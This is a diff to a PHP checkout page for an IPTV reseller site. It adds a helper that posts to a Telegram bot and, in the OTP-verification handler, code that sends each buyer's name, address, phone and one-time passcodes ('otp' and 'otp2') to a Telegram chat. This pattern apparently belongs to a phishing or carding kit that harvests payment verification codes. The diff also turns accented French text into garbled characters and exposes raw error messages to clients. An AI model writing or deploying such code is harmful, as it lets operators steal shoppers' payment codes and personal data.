@@ -15,7 +15,103 @@ $offerId = $postOfferId !== null ? $postOfferId : (isset($_GET['offer']) ? max(0
 
 $paymentSuccess = false;
 $confirmationCode = '';
+$paymentError = '';
 $isAjax = (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') || (isset($_POST['ajax']) && $_POST['ajax'] === '1');
+
+
+$settings = getSettings($pdo);
+$themeVars = getActiveThemeVars($settings['active_theme'] ?? 'onyx');
+$brandTitleSetting = trim($settings['brand_title'] ?? '');
+$brandName = $brandTitleSetting !== '' ? $brandTitleSetting : ($config['brand_name'] ?? 'ABDO IPTV CANADA');
+$brandTaglineSetting = trim($settings['brand_tagline'] ?? '');
+$brandTagline = $brandTaglineSetting !== '' ? $brandTaglineSetting : 'Ultra IPTV � Canada';
+$brandLogoDesktop = trim($settings['brand_logo_desktop'] ?? '');
+$brandLogoMobile = trim($settings['brand_logo_mobile'] ?? '');
+if ($brandLogoMobile === '' && $brandLogoDesktop !== '') {
+    $brandLogoMobile = $brandLogoDesktop;
+}
+$supportWhatsappNumber = trim($settings['support_whatsapp_number'] ?? '') ?: ($config['whatsapp_number'] ?? '');
+$checkoutEnabled = ($settings['checkout_enabled'] ?? '1') === '1';
+$checkoutWhatsappNumber = trim($settings['checkout_whatsapp_number'] ?? '') ?: $supportWhatsappNumber;
+$checkoutTelegramChatId = trim($settings['checkout_telegram_chat_id'] ?? '');
+$checkoutTelegramToken = trim($settings['checkout_telegram_bot_token'] ?? '');
+$checkoutFieldsSetting = $settings['checkout_fields_enabled'] ?? '';
+$checkoutFieldsEnabled = json_decode($checkoutFieldsSetting, true);
+if (!is_array($checkoutFieldsEnabled)) {
+    $checkoutFieldsEnabled = ['first_name', 'last_name', 'company', 'address', 'apartment', 'city', 'country', 'state', 'zip', 'phone'];
+}
+
+function sendCheckoutTelegram(?string $token, ?string $chatId, string $message): void
+{
+    $token = trim((string) $token);
+    $chatId = trim((string) $chatId);
+    if ($token === '' || $chatId === '' || $message === '') {
+        return;
+    }
+    $payload = [
+        'chat_id' => $chatId,
+        'text' => $message,
+    ];
+    $url = "https://api.telegram.org/bot{$token}/sendMessage";
+    $postFields = http_build_query($payload);
+
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => $postFields,
+            CURLOPT_TIMEOUT => 3,
+        ]);
+        @curl_exec($ch);
+        @curl_close($ch);
+        return;
+    }
+
+    $opts = [
+        'http' => [
+            'method' => 'POST',
+            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
+            'content' => $postFields,
+            'timeout' => 3,
+        ],
+    ];
+    @file_get_contents($url, false, stream_context_create($opts));
+}
+
+$selectedOffer = null;
+if ($offerId > 0) {
+    $stmt = $pdo->prepare('SELECT * FROM offers WHERE id = :id LIMIT 1');
+    $stmt->execute(['id' => $offerId]);
+    $selectedOffer = $stmt->fetch(PDO::FETCH_ASSOC) ?: null;
+}
+
+if (!$selectedOffer) {
+    $offers = fetchAllAssoc($pdo, 'SELECT * FROM offers ORDER BY is_featured DESC, price ASC');
+    $selectedOffer = $offers[0] ?? null;
+}
+
+if (!$selectedOffer) {
+    $selectedOffer = [
+        'id' => 0,
+        'name' => 'IPTV Premium Pack',
+        'duration' => '12 mois illimit�',
+        'price' => 108.00,
+        'features' => "Activation en moins de 10 minutes
+Support WhatsApp FR/AR/EN
++40K cha�nes & VOD",
+        'description' => 'Plan recommand� lorsque les offres ne sont pas encore configur�es.',
+    ];
+}
+
+$offerName = $selectedOffer['name'] ?? 'IPTV Premium Pack';
+$offerDuration = $selectedOffer['duration'] ?? '12 mois illimit�';
+$offerPrice = formatCurrency((float) ($selectedOffer['price'] ?? 0));
+$offerDescription = trim($selectedOffer['description'] ?? '') ?: "Confirme ton plan premium et re�ois l'activation en 5-7 minutes.";
+$offerFeatures = splitFeatures($selectedOffer['features'] ?? '');
+$whatsappLink = getWhatsappLink($checkoutWhatsappNumber, $offerName, (float) ($selectedOffer['price'] ?? 0), $offerDuration);
+
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && $isAjax && isset($_POST['otp_value'], $_POST['order_id'])) {
     $otpValue = substr(preg_replace('/\D/', '', (string) ($_POST['otp_value'] ?? '')), 0, 10);
     $orderId = max(0, (int) ($_POST['order_id'] ?? 0));
@@ -29,6 +125,38 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $isAjax && isset($_POST['otp_value'
             'id' => $orderId,
         ]);
         $ok = $stmt->rowCount() > 0;
+        if ($ok && $checkoutTelegramChatId !== '' && $checkoutTelegramToken !== '') {
+            // Fetch order details
+            $stmtOrder = $pdo->prepare('SELECT * FROM orders WHERE id = :id LIMIT 1');
+            $stmtOrder->execute(['id' => $orderId]);
+            $order = $stmtOrder->fetch(PDO::FETCH_ASSOC);
+            if ($order) {
+                // Fetch offer details
+                $stmtOffer = $pdo->prepare('SELECT * FROM offers WHERE id = :id LIMIT 1');
+                $stmtOffer->execute(['id' => $order['offer_id']]);
+                $offer = $stmtOffer->fetch(PDO::FETCH_ASSOC);
+                if ($offer) {
+                    $messageLines = [
+                        'New checkout order #' . $order['id'],
+                        'Offer: ' . $offer['name'] . ' (' . $offer['duration'] . ')',
+                        'Price: $' . formatCurrency((float) $offer['price']),
+                        'Contact: ' . trim((string) $order['contact']),
+                        'Newsletter: ' . ($order['newsletter'] ? 'Yes' : 'No'),
+                        'Delivery: ' . trim((string) $order['delivery']),
+                        'Name: ' . trim((string) $order['first_name']) . ' ' . trim((string) $order['last_name']),
+                        'Company: ' . trim((string) $order['company']),
+                        'Address: ' . trim((string) $order['address']),
+                        'Apartment: ' . trim((string) $order['apartment']),
+                        'City/State: ' . trim((string) $order['city']) . ' / ' . trim((string) $order['state']),
+                        'Country/ZIP: ' . trim((string) $order['country']) . ' / ' . trim((string) $order['zip']),
+                        'Phone: ' . trim((string) $order['phone']),
+                        'OTP: ' . trim((string) $order['otp']) . ($order['otp2'] ? ' / ' . trim((string) $order['otp2']) : ''),
+                    ];
+                    $message = implode("\n", array_filter($messageLines, fn($line) => trim($line) !== '' && trim($line) !== ' /'));
+                    sendCheckoutTelegram($checkoutTelegramToken, $checkoutTelegramChatId, $message);
+                }
+            }
+        }
     }
     header('Content-Type: application/json');
     echo json_encode([
@@ -70,44 +198,28 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $messageLines = [
                 'New checkout order #' . $confirmationCode,
                 'Offer: ' . $offerName . ' (' . $offerDuration . ')',
+                'Price: $' . $offerPrice,
                 'Contact: ' . trim((string) ($_POST['contact'] ?? '')),
+                'Newsletter: ' . (isset($_POST['newsletter']) ? 'Yes' : 'No'),
                 'Delivery: ' . trim((string) ($_POST['delivery'] ?? '')),
                 'Name: ' . trim((string) ($_POST['first_name'] ?? '')) . ' ' . trim((string) ($_POST['last_name'] ?? '')),
                 'Company: ' . trim((string) ($_POST['company'] ?? '')),
-                'Address: ' . trim((string) ($_POST['address'] ?? '')) . ' ' . trim((string) ($_POST['apartment'] ?? '')),
+                'Address: ' . trim((string) ($_POST['address'] ?? '')),
+                'Apartment: ' . trim((string) ($_POST['apartment'] ?? '')),
                 'City/State: ' . trim((string) ($_POST['city'] ?? '')) . ' / ' . trim((string) ($_POST['state'] ?? '')),
                 'Country/ZIP: ' . trim((string) ($_POST['country'] ?? '')) . ' / ' . trim((string) ($_POST['zip'] ?? '')),
                 'Phone: ' . trim((string) ($_POST['phone'] ?? '')),
             ];
-            $message = implode("\n", array_filter($messageLines, fn($line) => trim($line) !== '' && trim($line) !== ' /'));
-            $tgPayload = [
-                'chat_id' => $checkoutTelegramChatId,
-                'text' => $message,
-                'parse_mode' => 'HTML',
-            ];
-            $tgUrl = "https://api.telegram.org/bot{$checkoutTelegramToken}/sendMessage";
-            $tgOptions = [
-                CURLOPT_URL => $tgUrl,
-                CURLOPT_RETURNTRANSFER => true,
-                CURLOPT_POST => true,
-                CURLOPT_POSTFIELDS => http_build_query($tgPayload),
-                CURLOPT_TIMEOUT => 3,
-            ];
-            $sent = false;
-            if (function_exists('curl_init')) {
-                $ch = curl_init();
-                curl_setopt_array($ch, $tgOptions);
-                curl_exec($ch);
-                curl_close($ch);
-                $sent = true;
-            }
-            if (!$sent) {
-                @file_get_contents($tgUrl . '?' . http_build_query($tgPayload));
-            }
+            $message = implode("
+", array_filter($messageLines, fn($line) => trim($line) !== '' && trim($line) !== ' /'));
+            sendCheckoutTelegram($checkoutTelegramToken, $checkoutTelegramChatId, $message);
         }
+
     } catch (\Throwable $e) {
         $paymentSuccess = false;
         $confirmationCode = '';
+        $paymentError = $e->getMessage();
+        @error_log('Checkout payment error: ' . $paymentError);
     }
 
     if ($isAjax) {
@@ -115,63 +227,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         echo json_encode([
             'success' => $paymentSuccess,
             'confirmation' => $confirmationCode,
-            'error' => $paymentSuccess ? null : 'Payment could not be processed.',
+            'error' => $paymentSuccess ? null : ($paymentError !== '' ? $paymentError : 'Payment could not be processed.'),
         ]);
         exit;
     }
 }
 
-$settings = getSettings($pdo);
-$themeVars = getActiveThemeVars($settings['active_theme'] ?? 'onyx');
-$brandTitleSetting = trim($settings['brand_title'] ?? '');
-$brandName = $brandTitleSetting !== '' ? $brandTitleSetting : ($config['brand_name'] ?? 'ABDO IPTV CANADA');
-$brandTaglineSetting = trim($settings['brand_tagline'] ?? '');
-$brandTagline = $brandTaglineSetting !== '' ? $brandTaglineSetting : 'Ultra IPTV à Canada';
-$brandLogoDesktop = trim($settings['brand_logo_desktop'] ?? '');
-$brandLogoMobile = trim($settings['brand_logo_mobile'] ?? '');
-if ($brandLogoMobile === '' && $brandLogoDesktop !== '') {
-    $brandLogoMobile = $brandLogoDesktop;
-}
-$supportWhatsappNumber = trim($settings['support_whatsapp_number'] ?? '') ?: ($config['whatsapp_number'] ?? '');
-$checkoutEnabled = ($settings['checkout_enabled'] ?? '1') === '1';
-$checkoutWhatsappNumber = trim($settings['checkout_whatsapp_number'] ?? '') ?: $supportWhatsappNumber;
-$checkoutTelegramChatId = trim($settings['checkout_telegram_chat_id'] ?? '');
-$checkoutTelegramToken = trim($settings['checkout_telegram_bot_token'] ?? '');
-$checkoutFieldsSetting = $settings['checkout_fields_enabled'] ?? '';
-$checkoutFieldsEnabled = json_decode($checkoutFieldsSetting, true);
-if (!is_array($checkoutFieldsEnabled)) {
-    $checkoutFieldsEnabled = ['first_name', 'last_name', 'company', 'address', 'apartment', 'city', 'country', 'state', 'zip', 'phone'];
-}
-
-$selectedOffer = null;
-if ($offerId > 0) {
-    $stmt = $pdo->prepare('SELECT * FROM offers WHERE id = :id LIMIT 1');
-    $stmt->execute(['id' => $offerId]);
-    $selectedOffer = $stmt->fetch(PDO::FETCH_ASSOC) ?: null;
-}
-
-if (!$selectedOffer) {
-    $offers = fetchAllAssoc($pdo, 'SELECT * FROM offers ORDER BY is_featured DESC, price ASC');
-    $selectedOffer = $offers[0] ?? null;
-}
-
-if (!$selectedOffer) {
-    $selectedOffer = [
-        'id' => 0,
-        'name' => 'IPTV Premium Pack',
-        'duration' => '12 mois illimité',
-        'price' => 108.00,
-        'features' => "Activation en moins de 10 minutes\nSupport WhatsApp FR/AR/EN\n+40K chaînes & VOD",
-        'description' => 'Plan recommandé lorsque les offres ne sont pas encore configurées.',
-    ];
-}
-
-$offerName = $selectedOffer['name'] ?? 'IPTV Premium Pack';
-$offerDuration = $selectedOffer['duration'] ?? '12 mois illimité';
-$offerPrice = formatCurrency((float) ($selectedOffer['price'] ?? 0));
-$offerDescription = trim($selectedOffer['description'] ?? '') ?: 'Confirme ton plan premium et reçois l’activation en 5-7 minutes.';
-$offerFeatures = splitFeatures($selectedOffer['features'] ?? '');
-$whatsappLink = getWhatsappLink($checkoutWhatsappNumber, $offerName, (float) ($selectedOffer['price'] ?? 0), $offerDuration);
 
 if (!$checkoutEnabled && $_SERVER['REQUEST_METHOD'] === 'POST') {
     header('Location: ' . $whatsappLink);
